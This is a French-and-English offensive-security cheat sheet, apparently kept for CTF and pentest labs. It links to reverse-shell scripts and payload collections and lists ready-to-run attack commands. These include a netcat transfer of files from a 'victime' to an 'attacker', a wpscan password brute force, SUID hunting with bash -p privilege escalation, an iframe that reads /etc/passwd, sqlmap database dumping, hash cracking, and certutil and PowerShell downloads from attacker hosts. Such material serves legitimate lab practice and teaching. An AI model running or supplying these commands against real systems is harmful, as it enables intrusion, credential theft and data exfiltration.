```
===========================================

_______________________________ /\ 
\_   ___ \__    ___/\_   _____/ )/______
/    \  \/ |    |    |    __)    /  ___/
\     \____|    |    |     \     \___ \ 
 \______  /|____|    \___  /    /____  >
        \/               \/          \/ 

============================================
```
# Énumeration

[ENUM] linPEAS : https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS <br>
[ENUM] winPEAS : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat (.bat) <br>

# Objectif Reverse shell !

[SHELL] Netcat for windows : https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip <br>
[SHELL] Hacker tools : https://addons.mozilla.org/en-US/firefox/addon/hacktools/ <br>
[SHELL] Reverse Shells : https://www.revshells.com/ <br>
[SHELL] Reverse shell php : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <br>

# Utiles

[MISC] subdomains.txt : https://raw.githubusercontent.com/danTaler/WordLists/master/Subdomain.txt <br>
[MISC] Bypass authentication : https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass <br>
[MISC] PAYLOADSALLTHETHINGS : https://github.com/swisskyrepo/PayloadsAllTheThings (reverse shell, etc...) <br>
[MISC] Binaries exploit : https://gtfobins.github.io/ <br>


-------------------------------------------------------------------------------------------------------------------------------------------+
```
[+] => INFO GATHERING           - sudo -l
[+] => SPAWN SHELL USING PYTHON - python3 -c 'import pty; pty.spawn("/bin/sh")'
[+] => SPAWN SHELL USING BASH   - bash -i
[+] => WORDPRESS TOOL           - wpscan => ex (brute force mdp) wpscan --url 10.10.180.74/blog -U admin -P /usr/share/wordlists/rockyou.txt
[+] => TRANSFER FILE VIA NETCAT - [victime] nc -nv <ip> 1337 < <file_to_transfer> | [attacker] nc -lnvp 1337 > <file_to_transfer>

```
-------------------------------------------------------------------------------------------------------------------------------------------+
```

[CMD](JS)        => <iframe src=file:///etc/passwd></iframe>
[CMD](misconfig) => bash -p
[CMD](BINARIES)  => find / -user root -perm -4000 -exec ls -ldb {} \;
[CMD](ENUM)      => gobuster dir -u <url> -w=/usr/share/wordlists/dirb.../<list> -b <status_code_to_exclude>
[CMD](ENUM)      => nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP  (SAMBA)
                   smbclient //<ip>/anonymous (-U pour un utilisateurs)
                   smbget -R smb://<ip>/anonymous
[CMD](ENUM)      => ffuf -c -w /usr/share/wordlists/subdomains.txt -u http://domain.com/ -H "Host: FUZZ.domain.com" -fc 301
[CMD](list)      => msfvenom -l payloads | grep windows | grep reverse | grep shell  (exemple)
[CMD](decrypt)   => john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=<format>
[CMD](sql)       => sqlmap -r file.txt --dbms=mysql --dump | (après avoir copier une requête Burp dans un fichier txt)
[CMD](ftp)       => wget -m --no-passive ftp://anonymous:anonymous@<IP>  (download tout)

[RDP]            => xfreerdp /d:<domain> /u:'<user>' /p:'<password>' /v:<prefix>.<domain> /drive:.,kali-share +clipboard

[CMD](WIN)*PS*   => Invoke-WebRequest -Uri "http://<ip>:<port>/<file>" -Outfile <outfile>
[CMD](WIN)*PS*   => Expand-Archive <file.zip>
[CMD](AD)*PS*    => Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
[CMD](AD)*PS*    => Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose

[CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe


```
-------------------------------------------------------------------------------------------------------------------------------------------+
<br>
[?] Using "-p" on an SUID file will run it with the permission of the owner. Ex if root own a file and you run it (non-root) using "-p" you will run it with root perm
<br>

